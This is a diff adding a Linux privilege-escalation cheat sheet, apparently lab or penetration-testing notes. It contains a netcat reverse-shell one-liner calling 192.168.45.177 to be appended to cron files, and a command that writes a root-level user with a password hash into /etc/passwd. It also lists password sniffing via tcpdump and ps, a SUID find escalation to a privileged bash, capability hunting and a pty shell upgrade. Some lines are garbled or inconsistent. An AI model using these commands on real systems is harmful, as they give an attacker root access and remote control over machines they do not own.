@@ -1,0 +1,52 @@
+[ enum using tool ]
+
+1 - ./unix-privesc-check standard > output.txt
+
+2 - sudo -l 
+
+[ process ]
+
+3 - watch -n 1 "ps -aux | grep pass" 
+
+
+4 - sudo tcpdump -i lo -A | grep "pass"
+
+
+5 - ps aux
+
+[ cron jobs ] 
+
+1 - grep "CRON" /var/log/syslog
+
+2 - echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.177 1111 >/tmp/f" >> [ any file you find in the corn ]
+
+[ file writable /etc/passwd ]
+
+1 - echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+2 - su root2
+
+[ Abusing Setuid Binaries and Capabilities ]
+
+run this and keep it standby
+1 - passwd
+
+2 - ps u -C passwd
+
+3 - grep Uid /proc/1401/status > 1932 is the pid for passwd
+
+4 - cat /proc/1131/status | grep Uid 
+
+5 - ls -asl /usr/bin/passwd
+
+6 -rw[s]r-xr-x 1 passwd
+
+7 - find /home/joe/Desktop -exec "/usr/bin/bash" -p \; < quickly run this and give it real folder
+
+8 - /usr/sbin/getcap -r / 2>/dev/null < if you see cap_setuid+ep then you can be root ( GTFOBins )
+
+[ Abusing Sudo ]
+
+1 - sudo -l
+
+2 - maybe you need full ttys python3 -c 'import pty; pty.spawn("/bin/bash")'
